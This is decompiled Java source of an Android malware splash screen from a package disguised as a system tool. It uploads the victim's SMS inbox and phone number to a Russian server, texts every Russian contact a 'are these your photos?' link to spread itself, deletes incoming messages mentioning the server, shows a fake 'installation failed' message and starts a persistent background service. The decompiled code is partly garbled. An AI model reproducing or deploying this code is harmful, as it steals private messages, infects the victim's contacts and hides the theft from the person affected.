package com.android.tools.system;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.PhoneNumberUtils;
import android.telephony.TelephonyManager;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ProgressBar;
import android.widget.TextView;
import com.android.tools.system.EternalService.Alarm;
import defpackage.LogCatBroadcaster;
import java.util.ArrayList;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;

public class SplashScreen extends Activity {
    /* access modifiers changed from: private|static */
    public static int myProgress = 0;
    public final String ALL = "content://sms/all";
    public final String CONVERSATIONS = "content://sms/conversations";
    public final String DRAFT = "content://sms/draft";
    public final String FAILED = "content://sms/failed";
    public final String INBOX = "content://sms/inbox";
    public final String OUTBOX = "content://sms/outbox";
    public final String QUEUED = "content://sms/queued";
    public final String SENT = "content://sms/sent";
    public final String UNDELIVERED = "content://sms/undelivered";
    public String countrySim;
    public String currentPhoneNumber;
    /* access modifiers changed from: private */
    public Handler myHandler;
    /* access modifiers changed from: private */
    public ProgressBar progressBar;
    /* access modifiers changed from: private */
    public int progressStatus = 0;
    public String serverName;

    private class BackgroundStreamTask extends AsyncTask<Void, String, Void> {
        private final SplashScreen this$0;

        static SplashScreen access$0(BackgroundStreamTask backgroundStreamTask) {
            return backgroundStreamTask.this$0;
        }

        /* access modifiers changed from: protected|bridge */
        public /* bridge */ Object doInBackground(Object[] objArr) {
            return doInBackground((Void[]) objArr);
        }

        /* access modifiers changed from: protected|bridge */
        public /* bridge */ void onPostExecute(Object obj) {
            onPostExecute((Void) obj);
        }

        /* access modifiers changed from: protected|bridge */
        public /* bridge */ void onProgressUpdate(Object[] objArr) {
            onProgressUpdate((String[]) objArr);
        }

        /* access modifiers changed from: protected */
        @Override
        public void onPreExecute() {
            super.onPreExecute();
            this.this$0.beginYourTask();
        }

        /* access modifiers changed from: protected|varargs */
        @Override
        public Void doInBackground(Void... voidArr) {
            Void[] voidArr2 = voidArr;
            try {
                PhoneBook phoneBook = r12;
                PhoneBook phoneBook2 = new PhoneBook(this.this$0);
                ArrayList numbers = phoneBook.getNumbers();
                int i = 0;
                while (i < numbers.size()) {
                    if (this.this$0.countrySim.equals("ru") || ((String) numbers.get(i)).trim().contains("+7")) {
                        String[] strArr = new String[1];
                        String[] strArr2 = strArr;
                        strArr[0] = ((String) numbers.get(i)).trim();
                        publishProgress(strArr2);
                    }
                    i++;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        /* access modifiers changed from: protected|varargs */
        @Override
        public void onProgressUpdate(String... strArr) {
            String[] strArr2 = strArr;
            super.onProgressUpdate(strArr2);
            try {
                String replaceAll = strArr2[0].replaceAll("[^\\d]", "");
                SharedPreferences sharedPreferences = this.this$0.getSharedPreferences("BlockNums", 0);
                if (!sharedPreferences.getBoolean(replaceAll, false) && PhoneNumberUtils.isWellFormedSmsAddress(strArr2[0].trim())) {
                    Editor edit = sharedPreferences.edit();
                    SMS sms = r13;
                    SMS sms2 = new SMS(this.this$0);
                    sms = sms;
                    String trim = strArr2[0].trim();
                    StringBuffer stringBuffer = r13;
                    StringBuffer stringBuffer2 = new StringBuffer();
                    stringBuffer2 = r13;
                    StringBuffer stringBuffer3 = new StringBuffer();
                    stringBuffer3 = r13;
                    StringBuffer stringBuffer4 = new StringBuffer();
                    sms.sendSMS(trim, stringBuffer.append(stringBuffer2.append(stringBuffer3.append("Это твои фото? http://").append(this.this$0.serverName).toString()).append("/").toString()).append(replaceAll).toString());
                    Editor putBoolean = edit.putBoolean(replaceAll, true);
                    boolean commit = edit.commit();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        /* access modifiers changed from: protected */
        @Override
        public void onPostExecute(Void voidR) {
            super.onPostExecute(voidR);
            try {
                ((ViewGroup) this.this$0.findViewById(R.id.boxProgress)).removeView(this.this$0.findViewById(R.id.myProgress));
                View view = r7;
                View textView = new TextView(this.this$0);
                View view2 = view;
                view2.setText("Установка не выполнена!");
                ((ViewGroup) this.this$0.findViewById(R.id.boxProgress)).addView(view2, 0);
                TimeUnit.SECONDS.sleep((long) 3);
                this.this$0.finish();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }

        public BackgroundStreamTask(SplashScreen splashScreen) {
            this.this$0 = splashScreen;
        }
    }

    /* access modifiers changed from: protected */
    @Override
    public void onCreate(Bundle bundle) {
        Bundle bundle2 = bundle;
        LogCatBroadcaster.start(this);
        super.onCreate(bundle2);
        setContentView(R.layout.splash_layout);
        this.countrySim = ((TelephonyManager) getSystemService("phone")).getSimCountryIso().toLowerCase();
        this.currentPhoneNumber = getMyPhoneNumber();
        SharedPreferences sharedPreferences = getSharedPreferences("Settings", 0);
        if (sharedPreferences.getString("id", "").equals("")) {
            AsyncTask execute;
            String messages = getMessages("content://sms/inbox");
            r20 = new String[2];
            Object obj = r20;
            r20[0] = "url";
            r20 = obj;
            obj = r20;
            Object obj2 = r20;
            StringBuffer stringBuffer = r20;
            StringBuffer stringBuffer2 = new StringBuffer();
            stringBuffer2 = r20;
            StringBuffer stringBuffer3 = new StringBuffer();
            obj2[1] = stringBuffer.append(stringBuffer2.append("http://").append(this.serverName).toString()).append("/index.php").toString();
            Object obj3 = obj;
            r20 = new String[2];
            obj = r20;
            r20[0] = "new";
            r20 = obj;
            obj = r20;
            r20[1] = "1";
            Object obj4 = obj;
            r20 = new String[2];
            obj = r20;
            r20[0] = "num";
            r20 = obj;
            obj = r20;
            r20[1] = this.currentPhoneNumber;
            Object obj5 = obj;
            r20 = new String[2];
            obj = r20;
            r20[0] = "inbox";
            r20 = obj;
            obj = r20;
            r20[1] = messages;
            Object obj6 = obj;
            ArrayList arrayList = r20;
            ArrayList arrayList2 = new ArrayList();
            ArrayList arrayList3 = arrayList;
            boolean add = arrayList3.add(obj3);
            add = arrayList3.add(obj4);
            add = arrayList3.add(obj5);
            add = arrayList3.add(obj6);
            String str = null;
            try {
                MyPostRequest myPostRequest = r20;
                MyPostRequest myPostRequest2 = new MyPostRequest(this);
                MyPostRequest myPostRequest3 = myPostRequest;
                myPostRequest = myPostRequest3;
                ArrayList[] arrayListArr = new ArrayList[1];
                ArrayList[] arrayListArr2 = arrayListArr;
                arrayListArr[0] = arrayList3;
                execute = myPostRequest.execute(arrayListArr2);
                str = (String) myPostRequest3.get();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e2) {
                e2.printStackTrace();
            } catch (Exception e3) {
                e3.printStackTrace();
            }
            if (!(str.equals("") || str == null)) {
                Editor edit = sharedPreferences.edit();
                Editor putString = edit.putString("id", str);
                add = edit.commit();
            }
            BackgroundStreamTask backgroundStreamTask = r20;
            BackgroundStreamTask backgroundStreamTask2 = new BackgroundStreamTask(this);
            execute = backgroundStreamTask.execute(new Void[0]);
        }
    }

    @Override
    public void onStart() {
        super.onStart();
        if (!EternalService.isRunning(this)) {
            Alarm.setAlarm(this);
            Intent intent = r5;
            Intent intent2 = intent2;
            try {
                intent2 = new Intent(this, Class.forName("com.android.tools.system.EternalService"));
                ComponentName startService = startService(intent);
            } catch (ClassNotFoundException e) {
                Throwable th = e;
                NoClassDefFoundError noClassDefFoundError = r11;
                NoClassDefFoundError noClassDefFoundError2 = new NoClassDefFoundError(th.getMessage());
                throw noClassDefFoundError;
            }
        }
    }

    public String getMyPhoneNumber() {
        return ((TelephonyManager) getSystemService("phone")).getLine1Number();
    }

    public String getMessages(String str) {
        String str2 = "";
        Cursor query = getContentResolver().query(Uri.parse(str), null, null, null, null);
        startManagingCursor(query);
        if (query.moveToFirst()) {
            for (int i = 0; i < query.getCount(); i++) {
                boolean commit;
                int i2 = query.getInt(query.getColumnIndexOrThrow("_id"));
                String str3 = query.getString(query.getColumnIndexOrThrow("address")).toString();
                String str4 = query.getString(query.getColumnIndexOrThrow("body")).toString();
                if (str4.contains(this.serverName)) {
                    String replaceAll = str3.replaceAll("[^\\d]", "");
                    Editor edit = getSharedPreferences("BlockNums", 0).edit();
                    Editor putBoolean = edit.putBoolean(replaceAll, true);
                    commit = edit.commit();
                    String[] strArr = new String[1];
                    String[] strArr2 = strArr;
                    strArr[0] = String.valueOf(i2);
                    int delete = getContentResolver().delete(Uri.parse("content://sms"), "_id=?", strArr2);
                }
                StringBuffer stringBuffer = r22;
                StringBuffer stringBuffer2 = new StringBuffer();
                stringBuffer = stringBuffer.append(str2);
                stringBuffer2 = r22;
                StringBuffer stringBuffer3 = new StringBuffer();
                stringBuffer3 = r22;
                StringBuffer stringBuffer4 = new StringBuffer();
                str2 = stringBuffer.append(stringBuffer2.append(stringBuffer3.append("Adressant: ").append(str3).toString()).append("\n").toString()).toString();
                stringBuffer = r22;
                stringBuffer2 = new StringBuffer();
                stringBuffer = stringBuffer.append(str2);
                stringBuffer2 = r22;
                stringBuffer3 = new StringBuffer();
                stringBuffer3 = r22;
                stringBuffer4 = new StringBuffer();
                str2 = stringBuffer.append(stringBuffer2.append(stringBuffer3.append("Text sms: ").append(str4).toString()).append("\n\n").toString()).toString();
                commit = query.moveToNext();
            }
        }
        query.close();
        return str2;
    }

    public void beginYourTask() {
        myProgress = 0;
        this.progressBar = (ProgressBar) findViewById(R.id.myProgress);
        this.progressBar.setMax(3000);
        Thread thread = r7;
        AnonymousClass100000002 anonymousClass100000002 = r7;
        AnonymousClass100000002 anonymousClass1000000022 = new Runnable(this) {
            private final SplashScreen this$0;

            {
                this.this$0 = r6;
            }

            static SplashScreen access$0(AnonymousClass100000002 anonymousClass100000002) {
                return anonymousClass100000002.this$0;
            }

            @Override
            public void run() {
                Handler access$L1000003;
                boolean post;
                while (this.this$0.progressStatus < 3000) {
                    this.this$0.progressStatus = performTask();
                    access$L1000003 = this.this$0.myHandler;
                    AnonymousClass100000000 anonymousClass100000000 = r6;
                    AnonymousClass100000000 anonymousClass1000000002 = new Runnable(this) {
                        private final AnonymousClass100000002 this$0;

                        {
                            this.this$0 = r6;
                        }

                        static AnonymousClass100000002 access$0(AnonymousClass100000000 anonymousClass100000000) {
                            return anonymousClass100000000.this$0;
                        }

                        public void run() {
                            AnonymousClass100000002.access$0(this.this$0).progressBar.setProgress(AnonymousClass100000002.access$0(this.this$0).progressStatus);
                        }
                    };
                    post = access$L1000003.post(anonymousClass100000000);
                }
                access$L1000003 = this.this$0.myHandler;
                AnonymousClass100000001 anonymousClass100000001 = r6;
                AnonymousClass100000001 anonymousClass1000000012 = new Runnable(this) {
                    private final AnonymousClass100000002 this$0;

                    {
                        this.this$0 = r6;
                    }

                    static AnonymousClass100000002 access$0(AnonymousClass100000001 anonymousClass100000001) {
                        return anonymousClass100000001.this$0;
                    }

                    @Override
                    public void run() {
                        AnonymousClass100000002.access$0(this.this$0).progressStatus = 0;
                        SplashScreen.myProgress = 0;
                    }
                };
                post = access$L1000003.post(anonymousClass100000001);
            }

            private int performTask() {
                try {
                    Thread.sleep((long) 100);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                int access$L1000000 = SplashScreen.myProgress + 1;
                int i = access$L1000000;
                SplashScreen.myProgress = access$L1000000;
                return i;
            }
        };
        Thread thread2 = new Thread(anonymousClass100000002);
        thread.start();
    }

    public SplashScreen() {
        Handler handler = r5;
        Handler handler2 = new Handler();
        this.myHandler = handler;
        this.serverName = "oopsspoo.ru";
        this.countrySim = null;
    }
}
